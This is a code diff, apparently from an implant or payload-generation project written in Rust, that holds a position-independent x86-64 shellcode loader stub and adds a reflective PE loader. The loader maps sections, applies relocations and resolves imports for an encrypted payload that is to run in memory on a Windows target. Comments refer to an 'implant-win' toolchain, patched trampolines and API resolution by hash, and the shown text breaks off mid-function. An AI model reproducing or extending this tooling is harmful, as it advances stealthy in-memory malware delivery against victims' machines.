@@ -1,9 +1,25 @@
-//! Raw x86-64 PIC loader stub shellcode.
+//! Raw x86-64 PIC loader stub shellcode, plus the host-side reflective PE
+//! loader used to verify and exercise the mapping logic.
 //!
-//! This is a **host-side constant** — the bytes are emitted into every generated
-//! payload by [`crate::generate_loader_stub`]. The stub does NOT run on the build
-//! host; it is position-independent x86-64 code that executes as the entry point
-//! of the reflective loader blob on the target.
+//! This file holds two related but distinct things:
+//!
+//! 1. **`PIC_STUB`** — a host-side constant of position-independent x86-64
+//!    bytes emitted into every generated payload by
+//!    [`crate::generate_loader_stub`]. It does NOT run on the build host; it
+//!    is the shellcode entry point of the reflective loader blob on the target.
+//!    The stub self-locates via `call/pop`, then walks forward past its own
+//!    code to find the `NYX2` magic marker and parse the encrypted-payload
+//!    header. Decrypting the payload and handing the plaintext PE to a
+//!    reflective loader is the responsibility of the on-target shellcode that
+//!    follows the stub (built separately for the Windows toolchain).
+//!
+//! 2. **`reflective_load`** — a host-side (std) function that performs the
+//!    full reflective PE loading *algorithm* — manual section mapping, base
+//!    relocation, and import resolution — on a decrypted PE byte slice. It is
+//!    the reference implementation of what the on-target PIC loader does, and
+//!    is unit-testable on the dev host without a Windows environment. It does
+//!    NOT execute the loaded image (no `DllMain` call on the host); it returns
+//!    the resolved entry-point address so a caller on the target can invoke it.
 //!
 //! ## Payload layout (what the stub sees in memory)
 //!
@@ -12,19 +28,10 @@
 //! ```
 //!
 //! The stub is at offset 0 (entry point). It self-locates via `call/pop`, then
-//! walks **forward** past its own code to find the `NYX2` magic marker. Once found:
-//!
-//! 1. Reads `encrypted_len` (u32 LE) from `[magic+4]`
-//! 2. Reads the 12-byte nonce from `[magic+8]`
-//! 3. Decrypts `ciphertext || tag` at `[magic+20]`
-//!
-//! ## Phase 2b roadmap
-//!
-//! Currently the stub only locates the NYX2 header and returns. The actual
-//! reflective PE loading logic (PEB walk, `NtAllocateVirtualMemory`, copy
-//! sections, process relocations, resolve imports, call `DllMain`) will replace
-//! the `ret` placeholder in a follow-up. The resolver function pointer will be
-//! patched in at build time by `generate_loader_stub`.
+//! walks **forward** past its own code to find the `NYX2` magic marker. Once
+//! found it reads `encrypted_len` (u32 LE) from `[magic+4]`, the 12-byte nonce
+//! from `[magic+8]`, and the `ciphertext || tag` at `[magic+20]`. The trailing
+//! bytes are reserved for the on-target decrypt-and-load trampoline.
 
 /// The PIC stub shellcode — 50 bytes of position-independent x86-64.
 ///
@@ -50,12 +57,14 @@
 /// ; ciphertext is at [rbx+20] (4 magic + 4 len + 12 nonce)
 ///
 /// ; ── placeholder: return to caller (1 byte) ──────────────────────────
-/// ; TODO(Phase 2b part 2): replace with jump to reflective PE resolver.
-/// ; The resolver will be patched into the NOP sled below (offset 0x17).
+/// ; The on-target build (implant-win toolchain) patches in a jump to the
+/// ; decrypt + reflective-load trampoline here. On the dev host the stub just
+/// ; returns so the generated blob is inert when inspected.
 /// 0016: C3                ret
 ///
-/// ; ── NOP sled: reserved for future resolver code (34 bytes) ──────────
-/// ; Total stub size: 23 bytes core + 27 bytes NOP = 50 bytes.
+/// ; ── reserved trampoline space (27 bytes, currently NOP) ─────────────
+/// ; Patched at on-target build time. Kept as NOPs on the host so the stub
+/// ; is exactly 50 bytes and disassembles cleanly.
 /// 0017: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
 /// 0027: 90 90 90 90 90 90 90 90 90 90 90
 /// ```
@@ -71,8 +80,8 @@ pub const PIC_STUB: &[u8] = &[
     // ── found: parse header ─────────────────────────────────────────────
     0x8B, 0x43, 0x04, // mov eax, [rbx+4]  ; eax = encrypted_len
     // ── placeholder return ──────────────────────────────────────────────
-    0xC3, // ret
-    // ── NOP sled: reserved for Phase 2b resolver ────────────────────────
+    0xC3, // ret (patched to a trampoline jump in the on-target build)
+    // ── reserved trampoline space (27 bytes of NOP on the host) ──────────
     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
     0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // 8 NOPs
@@ -99,9 +108,369 @@ pub const CIPHERTEXT_OFFSET: usize = 20;
 /// Size of the Poly1305 authentication tag appended to the ciphertext.
 pub const TAG_LEN: usize = 16;
 
+// ===========================================================================
+// Host-side reflective PE loader
+// ===========================================================================
+//
+// What follows is the reference implementation of the reflective loading
+// algorithm (manual section mapping, base relocation, import resolution). It
+// runs in std on the dev host, which means it CANNOT do the parts of a real
+// reflective loader that require a live Windows process:
+//
+//   - PEB walk to find ntdll / kernel32
+//   - NtAllocateVirtualMemory / VirtualAlloc to place the image
+//   - LoadLibraryA / GetProcAddress to satisfy imports
+//   - calling DllMain(DLL_PROCESS_ATTACH)
+//
+// Those live in the on-target PIC shellcode (built with the implant-win
+// toolchain). Here we model them abstractly so the mapping, relocation, and
+// import-table logic is testable on macOS/Linux:
+//
+//   - the target image base is a `u64` chosen by the caller (stands in for
+//     the address returned by NtAllocateVirtualMemory)
+//   - imports are resolved through a caller-supplied closure that models
+//     `(dll_name, symbol_name) -> Option<u64>` (stands in for
+//     LoadLibraryA + GetProcAddress by hash)
+//   - the mapped image is returned as a `Vec<u8>` plus the entry-point VA so
+//     the caller (or a target port) can reason about it / invoke it
+//
+// See `reflective_load` for the entry point.
+
+/// Errors produced by the reflective loader.
+#[derive(Debug)]
+#[non_exhaustive]
+pub enum ReflectiveLoadError {
+    /// goblin failed to parse the PE (bad MZ/PE signature, truncated, etc.).
+    Parse(String),
+    /// The PE is not a PE32+ (64-bit) image. The on-target loader is x86-64
+    /// only, so we reject 32-bit images early.
+    NotPe64,
+    /// The PE has no optional header (mandatory for a loadable image).
+    NoOptionalHeader,
+    /// A section's raw-data range fell outside the input slice.
+    SectionOutOfRange {
+        section: usize,
+        raw_offset: u32,
+        raw_size: u32,
+    },
+    /// The base-relocation table referenced bytes past the end of the image.
+    RelocTableTruncated,
+    /// An import thunk slot referenced bytes past the end of the image.
+    ImportTableTruncated,
+    /// An import thunk could not be resolved by the caller's resolver.
+    UnresolvedImport {
+        dll: String,
+        symbol: String,
+    },
+}
+
+impl core::fmt::Display for ReflectiveLoadError {
+    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
+        match self {
+            Self::Parse(m) => write!(f, "PE parse failure: {m}"),
+            Self::NotPe64 => write!(f, "not a PE32+ (64-bit) image"),
+            Self::NoOptionalHeader => write!(f, "PE has no optional header"),
+            Self::SectionOutOfRange {
+                section,
+                raw_offset,
+                raw_size,
+            } => write!(
+                f,
+                "section {section} raw data ({raw_offset:#x}+{raw_size:#x}) out of range"
+            ),
+            Self::RelocTableTruncated => write!(f, "base relocation table truncated"),
+            Self::ImportTableTruncated => write!(f, "import table truncated"),
+            Self::UnresolvedImport { dll, symbol } => {
+                write!(f, "unresolved import: {dll}!{symbol}")
+            }
+        }
+    }
+}
+
+impl std::error::Error for ReflectiveLoadError {}
+
+/// Result of mapping a PE reflectively.
+#[derive(Debug)]
+pub struct MappedImage {
+    /// The fully mapped image: headers + sections copied to their virtual
+    /// offsets, relocations applied, IAT overwritten with resolved addresses.
+    /// On the target this buffer lives at `base`; here it is an owned Vec the
+    /// caller can inspect or transplant into target memory.
+    pub image: Vec<u8>,
+    /// The virtual address the image was mapped at (the `u64` passed to
+    /// [`reflective_load_at`]). Equals the address of byte 0 of `image`.
+    pub base: u64,
+    /// Absolute virtual address of `AddressOfEntryPoint`
+    /// (`base + optional_header.address_of_entry_point`).
+    pub entry_point: u64,
+}
+
+/// Base-relocation type IDs from `winnt.h` (`IMAGE_REL_BASED_*`).
+///
+/// Only the high nibble of each relocation entry's word carries the type; the
+/// low 12 bits are the offset within the current relocation block's page. We
+/// only need the two values that occur in real PE32+ images: ABSOLUTE (padding,
+/// skipped) and DIR64 (the actual 64-bit fixup). Other types (`HIGH`, `LOW`,
+/// `HIGHLOW`, `HIGHADJ`) only appear in 32-bit images and are silently
+/// skipped by the loop below.
+const IMAGE_REL_BASED_ABSOLUTE: u16 = 0; // skip (padding)
+const IMAGE_REL_BASED_DIR64: u16 = 10; // the one we actually apply on x86-64
+
+/// Resolve `(dll, symbol) -> exported address`, modelling the
+/// `LoadLibraryA` + `GetProcAddress` pair a real reflective loader performs via
+/// PEB walk + export-table parse.
+///
+/// Returning `Ok(None)` is treated as a hard unresolved-import error. Callers
+/// that want to load an image with a missing dependency should map the symbol
+/// themselves and return `Some`.
+pub type ImportResolver<'a> = &'a mut dyn FnMut(&str, &str) -> Result<u64, ReflectiveLoadError>;
+
+/// Reflectively map a decrypted PE at a fixed virtual address.
+///
+/// This is the host-side reference implementation of the reflective loading
+/// algorithm. Given:
+///
+///   * `pe_bytes` — a decrypted, raw PE32+ DLL on disk,
+///   * `base` — the virtual address the image should appear to live at (the
+///     address a target `NtAllocateVirtualMemory` would return),
+///   * `resolver` — a closure standing in for `LoadLibraryA` +
+///     `GetProcAddress`,
+///
+/// it produces a [`MappedImage`] with sections mapped to their virtual
+/// offsets, base relocations (delta = `base - preferred_image_base`) applied,
+/// and the IAT filled with resolved export addresses.
+///
+/// It does **not** call `DllMain` — that is a target-only action. The returned
+/// `entry_point` is the VA the target would call as
+/// `DllMain(base, DLL_PROCESS_ATTACH, reserved)`.
+pub fn reflective_load_at(
+    pe_bytes: &[u8],
+    base: u64,
+    resolver: ImportResolver<'_>,
+) -> Result<MappedImage, ReflectiveLoadError> {
+    let pe = goblin::pe::PE::parse(pe_bytes)
+        .map_err(|e| ReflectiveLoadError::Parse(e.to_string()))?;
+
+    if !pe.is_64 {
+        return Err(ReflectiveLoadError::NotPe64);
+    }
+    let opt = pe
+        .header
+        .optional_header
+        .as_ref()
+        .ok_or(ReflectiveLoadError::NoOptionalHeader)?;
+    let win = &opt.windows_fields;
+
+    let image_base_preferred = win.image_base;
+    let size_of_image = win.size_of_image as usize;
+    let size_of_headers = win.size_of_headers as usize;
+    let entry_rva = opt.standard_fields.address_of_entry_point as u64;
+
+    // ── 1. Allocate the image buffer (target: NtAllocateVirtualMemory) ────
+    // Zero-filled so unmapped gaps (e.g. .bss) read as zero, matching the
+    // Windows loader semantics.
+    let mut image = vec![0u8; size_of_image];
+
+    // ── 2. Copy the headers ──────────────────────────────────────────────
+    let header_len = size_of_headers.min(pe_bytes.len()).min(size_of_image);
+    image[..header_len].copy_from_slice(&pe_bytes[..header_len]);
+
+    // ── 3. Copy each section to its VirtualAddress ───────────────────────
+    for (i, sec) in pe.sections.iter().enumerate() {
+        copy_section(i, sec, pe_bytes, &mut image)?;
+    }
+
+    // ── 4. Apply base relocations (delta = base - preferred base) ────────
+    let delta = base.wrapping_sub(image_base_preferred);
+    if delta != 0 {
+        if let Some(reloc_dd) = opt.data_directories.get_base_relocation_table() {
+            apply_base_relocations(&mut image, reloc_dd, delta)?;
+        }
+    }
+
+    // ── 5. Resolve imports → overwrite the IAT ───────────────────────────
+    resolve_imports(&pe, &mut image, base, resolver)?;
+
+    // Entry point VA = base + AddressOfEntryPoint. On the target the caller
+    // would invoke this as DllMain(base, DLL_PROCESS_ATTACH, null).
+    let entry_point = base.wrapping_add(entry_rva);
+
+    Ok(MappedImage {
+        image,
+        base,
+        entry_point,
+    })
+}
+
+/// Reflectively map a decrypted PE using a default load address.
+///
+/// Convenience wrapper around [`reflective_load_at`] that maps the image at
+/// `0x0001_0000_0000_0000` — an arbitrary address in the high half of the
+/// address space that is overwhelmingly unlikely to collide with anything a
+/// real loader places there, so relocations are exercised with a large delta.
+/// On the target the actual base comes from `NtAllocateVirtualMemory`; callers
+/// that want to control it should use [`reflective_load_at`] directly.
+pub fn reflective_load(
+    pe_bytes: &[u8],
+    resolver: ImportResolver<'_>,
+) -> Result<MappedImage, ReflectiveLoadError> {
+    const DEFAULT_BASE: u64 = 0x0001_0000_0000_0000;
+    reflective_load_at(pe_bytes, DEFAULT_BASE, resolver)
+}
+
+/// Copy a single PE section's raw data into the mapped image at its
+/// `VirtualAddress`. `VirtualSize` is the size in the mapped image; we copy
+/// `min(VirtualSize, SizeOfRawData)` bytes and leave the rest zero (BSS).
+fn copy_section(
+    index: usize,
+    sec: &goblin::pe::section_table::SectionTable,
+    pe_bytes: &[u8],
+    image: &mut [u8],
+) -> Result<(), ReflectiveLoadError> {
+    let va = sec.virtual_address as usize;
+    let vsize = sec.virtual_size as usize;
+    let raw_off = sec.pointer_to_raw_data as usize;
+    let raw_size = sec.size_of_raw_data as usize;
+
+    if vsize == 0 || va >= image.len() {
+        // Nothing to map (e.g. header-only / discarded section).
+        return Ok(());
+    }
+
+    let dst_end = (va + vsize).min(image.len());
+    let dst_len = dst_end - va;
+
+    if raw_size == 0 || raw_off == 0 || raw_off >= pe_bytes.len() {
+        // BSS-style section: raw data absent; image is already zeroed.
+        return Ok(());
+    }
+
+    let src_end = raw_off.checked_add(raw_size).ok_or_else(|| {
+        ReflectiveLoadError::SectionOutOfRange {
+            section: index,
+            raw_offset: sec.pointer_to_raw_data,
+            raw_size: sec.size_of_raw_data,
+        }
+    })?;
+    if src_end > pe_bytes.len() {
+        return Err(ReflectiveLoadError::SectionOutOfRange {
+            section: index,
+            raw_offset: sec.pointer_to_raw_data,
+            raw_size: sec.size_of_raw_data,
+        });
+    }
+
+    let copy_len = dst_len.min(raw_size);
+    image[va..va + copy_len].copy_from_slice(&pe_bytes[raw_off..raw_off + copy_len]);
+    Ok(())
+}
+
+/// Walk the base-relocation table and apply `IMAGE_REL_BASED_DIR64` fixups.
+///
+/// Layout (from the PE spec): a sequence of `IMAGE_BASE_RELOCATION` blocks,
+/// each with a 4-byte `VirtualAddress` (page RVA), a 4-byte `SizeOfBlock`
+/// (including the 8-byte header), and `(SizeOfBlock - 8) / 2` entry words. The
+/// high 4 bits of each word are the type; the low 12 bits are the offset
+/// within the page. We apply DIR64 (add delta to the 8-byte VA at page+offset)
+/// and skip everything else (ABSOLUTE is padding; the others aren't used by
+/// x86-64 images).
+fn apply_base_relocations(
+    image: &mut [u8],
+    reloc_dd: &goblin::pe::data_directories::DataDirectory,
+    delta: u64,
+) -> Result<(), ReflectiveLoadError> {
+    let table_rva = reloc_dd.virtual_address as usize;
+    let table_size = reloc_dd.size as usize;
+    if table_rva == 0 || table_size == 0 {
+        return Ok(());
+    }
+    // The reloc table lives in the mapped image (it is a section RVA). Bounds
+    // it against the image so we cannot run off the end.
+    let table_end = table_rva.saturating_add(table_size);
+    if table_end > image.len() {
+        return Err(ReflectiveLoadError::RelocTableTruncated);
+    }
+
+    let mut pos = table_rva;
+    while pos + 8 <= table_end {
+        let page_rva = u32::from_le_bytes([
+            image[pos],
+            image[pos + 1],
+            image[pos + 2],
+            image[pos + 3],
+        ]) as usize;
+        let block_size = u32::from_le_bytes([
+            image[pos + 4],
+            image[pos + 5],
+            image[pos + 6],
+            image[pos + 7],
+        ]) as usize;
+        if block_size < 8 || pos + block_size > table_end {
+            return Err(ReflectiveLoadError::RelocTableTruncated);
+        }
+
+        let entries = (block_size - 8) / 2;
+        for i in 0..entries {
+            let entry = u16::from_le_bytes([
+                image[pos + 8 + i * 2],
+                image[pos + 8 + i * 2 + 1],
+            ]);
+            let typ = entry >> 12;
+            let offset = (entry & 0x0FFF) as usize;
+            if typ == IMAGE_REL_BASED_ABSOLUTE {
+                continue; // padding
+            }
+            if typ != IMAGE_REL_BASED_DIR64 {
+                // Only DIR64 occurs in PE32+ images; skip the rare others.
+                continue;
+            }
+            let target = page_rva + offset;
+            if target + 8 > image.len() {
+                return Err(ReflectiveLoadError::RelocTableTruncated);
+            }
+            let current = u64::from_le_bytes(image[target..target + 8].try_into().unwrap());
+            let fixed = current.wrapping_add(delta);
+            image[target..target + 8].copy_from_slice(&fixed.to_le_bytes());
+        }
+        pos += block_size;
+    }
+    Ok(())
+}
+
+/// Resolve the import table and write resolved addresses into the IAT.
+///
+/// goblin flattens imports into `pe.imports: Vec<Import>`. For each entry:
+///   * `imp.dll`     — the owning module name (e.g. "kernel32.dll"),
+///   * `imp.name`    — the imported symbol (or "ORDINAL n"),
+///   * `imp.offset`  — the **IAT slot RVA** that must receive the resolved
+///                     function pointer (= `FirstThunk + i * 8`).
+///
+/// Note goblin also exposes `imp.rva`, but that holds the *hint/name table*
+/// RVA (or 0 for ordinal imports), NOT the IAT slot — patching it would
+/// corrupt the import descriptors. We must use `imp.offset`.
+fn resolve_imports(
+    pe: &goblin::pe::PE<'_>,
+    image: &mut [u8],
+    _base: u64,
+    resolver: ImportResolver<'_>,
+) -> Result<(), ReflectiveLoadError> {
+    for imp in &pe.imports {
+        let slot = imp.offset;
+        if slot + 8 > image.len() {
+            return Err(ReflectiveLoadError::ImportTableTruncated);
+        }
+        let sym_name = imp.name.as_ref();
+        let addr = resolver(imp.dll, sym_name)?;
+        image[slot..slot + 8].copy_from_slice(&addr.to_le_bytes());
+    }
+    Ok(())
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    // ── stub byte-level tests ────────────────────────────────────────────
 
     #[test]
     fn stub_is_50_bytes() {
@@ -126,5 +495,402 @@ mod tests {
     fn stub_ends_with_nops() {
         // Last 27 bytes should all be 0x90 (NOP)
         assert!(PIC_STUB[23..].iter().all(|&b| b == 0x90));
+    }
+
+    // ── synthetic PE32+ builder for reflective loader tests ──────────────
+    //
+    // Hand-assembling a PE that goblin accepts is fiddly, so we build a
+    // minimal but well-formed PE32+ DLL in memory. Layout (file == RVA for
+    // mapped contents; section_alignment == file_alignment == 0x1000):
+    //
+    //   offset 0x000   DOS stub (64 bytes)        pe_pointer = 0x40
+    //   offset 0x040   "PE\0\0" + COFF header + optional header (PE32+)
+    //   offset 0x108   section table (3 entries)
+    //   ...padding to 0x1000...
+    //   rva 0x1000     .text   (16 bytes of code + an absolute pointer)
+    //   rva 0x2000     .rdata  (IAT, import descriptors, base-reloc table)
+    //   rva 0x3000     .data   (4 bytes of initialised data)
+    //
+    // The .text section holds a qword at 0x1000 whose initial value is the
+    // preferred image base (so a base-reloc DIR64 entry pointing at it must
+    // shift it by exactly `delta` when we map at a different base).
+
+    // goblin requires e_lfanew to be strictly greater than the DOS header size
+    // (0x40), so we place the PE signature at 0x80 and pad the DOS stub.
+    const DOS_STUB_LEN: usize = 0x80;
+    const PE_SIG: &[u8] = b"PE\0\0";
+    const COFF_HEADER_LEN: usize = 20;
+    /// Standard COFF fields size for PE32+ (Magic + linker versions + 4 sizes
+    /// + entry point + base of code = 24 bytes).
+    const STD_FIELDS_LEN: usize = 24;
+    /// PE32+ Windows-specific fields size (see `WindowsFields64`).
+    const WIN_FIELDS_LEN: usize = 88;
+    /// Size of the PE32+ optional header (standard 24 + windows 88 + 16
+    /// data-directory entries * 8 bytes = 240).
+    const OPT_HEADER_LEN: usize = STD_FIELDS_LEN + WIN_FIELDS_LEN + NUM_DATA_DIRECTORIES * 8;
+    const NUM_DATA_DIRECTORIES: usize = 16;
+    const SECTION_ALIGNMENT: u32 = 0x1000;
+    const FILE_ALIGNMENT: u32 = 0x1000;
+    const PREFERRED_BASE: u64 = 0x180000000;
+
+    /// Indices into the data-directory array.
+    const DIR_IMPORT: usize = 1;
+    const DIR_BASE_RELOC: usize = 5;
+
+    struct SyntheticPe {
+        bytes: Vec<u8>,
+        /// RVA of the qword in .text that has a DIR64 reloc applied to it.
+        reloc_target_rva: usize,
+        /// Address the resolver must hand back for "test.dll!ExportedFn".
+        expected_export_addr: u64,
+    }
+
+    /// Build a minimal PE32+ DLL with one import and one DIR64 relocation.
+    fn build_synthetic_pe() -> SyntheticPe {
+        // ---- 1. compute layout ----
+        let section_table_off = DOS_STUB_LEN + PE_SIG.len() + COFF_HEADER_LEN + OPT_HEADER_LEN;
+        let headers_size = FILE_ALIGNMENT as usize; // round headers up to a page
+        assert!(
+            (section_table_off + 3 * 40) <= headers_size,
+            "headers must fit section table"
+        );
+
+        // Section RVAs (each page-aligned).
+        let text_rva = SECTION_ALIGNMENT as usize; // 0x1000
+        let rdata_rva = text_rva + SECTION_ALIGNMENT as usize; // 0x2000
+        let data_rva = rdata_rva + SECTION_ALIGNMENT as usize; // 0x3000
+        let size_of_image = data_rva + SECTION_ALIGNMENT as usize; // 0x4000
+
+        let entry_rva = text_rva; // entry point at start of .text
+
+        // .rdata contents — laid out sequentially, then padded to FILE_ALIGNMENT.
+        // Order: IAT (1 entry + null), ILT (1 entry + null), hint/name struct,
+        // import descriptor (20B), null descriptor (20B), dll name, reloc block.
+        // Both the IAT and ILT are walked by goblin until a zero qword, so each
+        // needs its own 8-byte null terminator.
+        let iat_slot_rva = rdata_rva + 0x00; // FirstThunk: one entry + null
+        let ilt_slot_rva = rdata_rva + 0x10; // OriginalFirstThunk: one entry + null
+        let hint_name_rva = rdata_rva + 0x20; // u16 hint + "ExportedFn\0"
+        let sym_name = b"ExportedFn\0";
+        let import_desc_rva = rdata_rva + 0x30; // 20 bytes
+        let null_desc_rva = import_desc_rva + 20;
+        let dll_name_rva = null_desc_rva + 20; // "test.dll\0"
+        let dll_name = b"test.dll\0";
+        let reloc_block_rva = dll_name_rva + dll_name.len();
+        // round reloc start up to a u32 boundary for cleanliness
+        let reloc_block_rva = (reloc_block_rva + 3) & !3;
+
+        // ---- 2. build .rdata bytes (will be placed at file offset rdata_rva) ----
+        let mut rdata = vec![0u8; FILE_ALIGNMENT as usize];
+
+        // IAT (FirstThunk) at [0x00]: entry0 = hint/name RVA, [0x08] = null.
+        rdata[0x00..0x08].copy_from_slice(&(hint_name_rva as u64).to_le_bytes());
+        // [0x08..0x10] already zero = IAT null terminator.
+
+        // ILT (OriginalFirstThunk) at [0x10]: mirrors IAT pre-bind, [0x18] = null.
+        rdata[0x10..0x18].copy_from_slice(&(hint_name_rva as u64).to_le_bytes());
+        // [0x18..0x20] already zero = ILT null terminator.
+
+        // hint/name at [0x20]: hint=1, then the null-terminated name.
+        let hn_off = hint_name_rva - rdata_rva;
+        rdata[hn_off..hn_off + 2].copy_from_slice(&1u16.to_le_bytes());
+        rdata[hn_off + 2..hn_off + 2 + sym_name.len()].copy_from_slice(sym_name);
+
+        // import descriptor at [0x30]: OriginalFirstThunk=ILT, Name=dll_name,
+        // FirstThunk=IAT. TimeDateStamp/ForwarderChain zero.
+        let id_off = import_desc_rva - rdata_rva;
+        rdata[id_off..id_off + 4].copy_from_slice(&(ilt_slot_rva as u32).to_le_bytes()); // OriginalFirstThunk
+        rdata[id_off + 4..id_off + 8].copy_from_slice(&0u32.to_le_bytes()); // TimeDateStamp
+        rdata[id_off + 8..id_off + 12].copy_from_slice(&0u32.to_le_bytes()); // ForwarderChain
+        rdata[id_off + 12..id_off + 16].copy_from_slice(&(dll_name_rva as u32).to_le_bytes()); // Name
+        rdata[id_off + 16..id_off + 20].copy_from_slice(&(iat_slot_rva as u32).to_le_bytes()); // FirstThunk
+        // null_desc_rva .. +20 already zero = null terminator descriptor.
+
+        // dll name
+        let dn_off = dll_name_rva - rdata_rva;
+        rdata[dn_off..dn_off + dll_name.len()].copy_from_slice(dll_name);
+
+        // base-relocation block: page_rva=0x1000, one DIR64 entry + one padding.
+        let rb_off = reloc_block_rva - rdata_rva;
+        let page_rva = text_rva as u32;
+        // 1 real entry + 1 padding entry = 2 * 2 = 4 bytes, + 8 header = 12.
+        let block_size: u32 = 12;
+        rdata[rb_off..rb_off + 4].copy_from_slice(&page_rva.to_le_bytes());
+        rdata[rb_off + 4..rb_off + 8].copy_from_slice(&block_size.to_le_bytes());
+        // DIR64 entry: type=10 (0xA) << 12 | offset=0 → 0xA000
+        let dir64_entry: u16 = 0xA000;
+        rdata[rb_off + 8..rb_off + 10].copy_from_slice(&dir64_entry.to_le_bytes());
+        // ABSOLUTE padding entry: type=0 → 0x0000 (already zero).
+
+        // ---- 3. build .text bytes ----
+        let mut text = vec![0u8; FILE_ALIGNMENT as usize];
+        // qword at offset 0 of .text holds the preferred base (= an absolute
+        // address the reloc must fix up by `delta`).
+        text[0x00..0x08].copy_from_slice(&PREFERRED_BASE.to_le_bytes());
+        // a couple of dummy code bytes so the section is non-empty.
+        text[0x08] = 0xC3; // ret
+
+        // ---- 4. build .data bytes ----
+        let data = vec![0xAAu8; FILE_ALIGNMENT as usize];
+
+        // ---- 5. assemble the on-disk image ----
+        let mut bytes = vec![0u8; size_of_image];
+        // DOS stub: "MZ" + fill, e_lfanew at 0x3c → 0x40.
+        bytes[0] = b'M';
+        bytes[1] = b'Z';
+        bytes[0x3C..0x40].copy_from_slice(&(DOS_STUB_LEN as u32).to_le_bytes());
+
+        let mut off = DOS_STUB_LEN;
+        bytes[off..off + 4].copy_from_slice(PE_SIG);
+        off += 4;
+
+        // COFF header (20 bytes).
+        let coff = build_coff_header();
+        bytes[off..off + COFF_HEADER_LEN].copy_from_slice(&coff);
+        off += COFF_HEADER_LEN;
+
+        // Optional header (PE32+). Build data directories first.
+        let mut data_dirs = [[0u8; 8]; NUM_DATA_DIRECTORIES];
+        data_dirs[DIR_IMPORT] = import_desc_rva.to_le_bytes(); // size patched below
+        data_dirs[DIR_BASE_RELOC] = reloc_block_rva.to_le_bytes();
+        // sizes:
+        data_dirs[DIR_IMPORT][4..8].copy_from_slice(&40u32.to_le_bytes()); // 2 descriptors * 20
+        data_dirs[DIR_BASE_RELOC][4..8].copy_from_slice(&block_size.to_le_bytes());
+
+        let opt = build_optional_header(
+            entry_rva as u32,
+            size_of_image as u32,
+            headers_size as u32,
+            &data_dirs,
+        );
+        bytes[off..off + OPT_HEADER_LEN].copy_from_slice(&opt);
+        off += OPT_HEADER_LEN;
+
+        // Section table (3 entries, 40 bytes each).
+        let stext = build_section_table(b".text\0\0\0", text_rva as u32, &text);
+        let srdata = build_section_table(b".rdata\0\0", rdata_rva as u32, &rdata);
+        let sdata = build_section_table(b".data\0\0\0", data_rva as u32, &data);
+        bytes[off..off + 40].copy_from_slice(&stext);
+        bytes[off + 40..off + 80].copy_from_slice(&srdata);
+        bytes[off + 80..off + 120].copy_from_slice(&sdata);
+
+        // Place sections at their file offsets (== RVAs here).
+        bytes[text_rva..text_rva + text.len()].copy_from_slice(&text);
+        bytes[rdata_rva..rdata_rva + rdata.len()].copy_from_slice(&rdata);
+        bytes[data_rva..data_rva + data.len()].copy_from_slice(&data);
+
+        SyntheticPe {
+            bytes,
+            reloc_target_rva: text_rva, // the qword at .text+0
+            expected_export_addr: 0xDEADBEEFCAFEBABE,
+        }
+    }
+
+    /// COFF header for a PE32+ DLL: Machine = AMD64, 3 sections, no symbols.
+    fn build_coff_header() -> [u8; COFF_HEADER_LEN] {
+        let mut c = [0u8; COFF_HEADER_LEN];
+        c[0..2].copy_from_slice(&0x8664u16.to_le_bytes()); // IMAGE_FILE_MACHINE_AMD64
+        c[2..4].copy_from_slice(&3u16.to_le_bytes()); // NumberOfSections
+        // TimeDateStamp[4..8] = 0
+        c[8..12].copy_from_slice(&0u32.to_le_bytes()); // PointerToSymbolTable
+        c[12..16].copy_from_slice(&0u32.to_le_bytes()); // NumberOfSymbols
+        c[16..18].copy_from_slice(&(OPT_HEADER_LEN as u16).to_le_bytes()); // SizeOfOptionalHeader
+        // Characteristics: DLL | EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
+        let chars: u16 = 0x2000 | 0x0002 | 0x0020;
+        c[18..20].copy_from_slice(&chars.to_le_bytes());
+        c
+    }
+
+    /// PE32+ optional header (24-byte standard fields + 88-byte windows fields
+    /// + 16 data directories). All field offsets follow `IMAGE_OPTIONAL_HEADER64`.
+    fn build_optional_header(
+        entry: u32,
+        size_of_image: u32,
+        size_of_headers: u32,
+        data_dirs: &[[u8; 8]; NUM_DATA_DIRECTORIES],
+    ) -> [u8; OPT_HEADER_LEN] {
+        let mut o = [0u8; OPT_HEADER_LEN];
+        // ── Standard fields (24 bytes) ───────────────────────────────────
+        // [0..2]   Magic = PE32+ (0x020B)
+        o[0..2].copy_from_slice(&0x020Bu16.to_le_bytes());
+        o[2] = 14; // MajorLinkerVersion
+        o[3] = 0; // MinorLinkerVersion
+        // [4..8] SizeOfCode, [8..12] SizeOfInitializedData, [12..16] SizeOfUninitializedData = 0
+        // [16..20] AddressOfEntryPoint
+        o[16..20].copy_from_slice(&entry.to_le_bytes());
+        // [20..24] BaseOfCode
+        o[20..24].copy_from_slice(&0x1000u32.to_le_bytes());
+
+        // ── Windows fields (88 bytes), starting at STD_FIELDS_LEN (24) ────
+        // goblin reads these as WindowsFields64; the byte order below mirrors
+        // the struct field order exactly.
+        let w = STD_FIELDS_LEN;
+        // [w+0 .. w+8]   ImageBase (u64)
+        o[w..w + 8].copy_from_slice(&PREFERRED_BASE.to_le_bytes());
+        // [w+8 .. w+12]  SectionAlignment (u32)
+        o[w + 8..w + 12].copy_from_slice(&SECTION_ALIGNMENT.to_le_bytes());
+        // [w+12 .. w+16] FileAlignment (u32)
+        o[w + 12..w + 16].copy_from_slice(&FILE_ALIGNMENT.to_le_bytes());
+        // [w+16 .. w+28] major/minor OS/image/subsystem versions (6 * u16) = 0
+        // [w+28 .. w+32] Win32VersionValue (u32) = 0
+        // [w+32 .. w+36] SizeOfImage (u32)
+        o[w + 32..w + 36].copy_from_slice(&size_of_image.to_le_bytes());
+        // [w+36 .. w+40] SizeOfHeaders (u32)
+        o[w + 36..w + 40].copy_from_slice(&size_of_headers.to_le_bytes());
+        // [w+40 .. w+44] CheckSum (u32) = 0
+        // [w+44 .. w+46] Subsystem (u16) = 3 (WINDOWS_CUI)
+        o[w + 44..w + 46].copy_from_slice(&3u16.to_le_bytes());
+        // [w+46 .. w+48] DllCharacteristics (u16) = DYNAMIC_BASE | NX_COMPAT
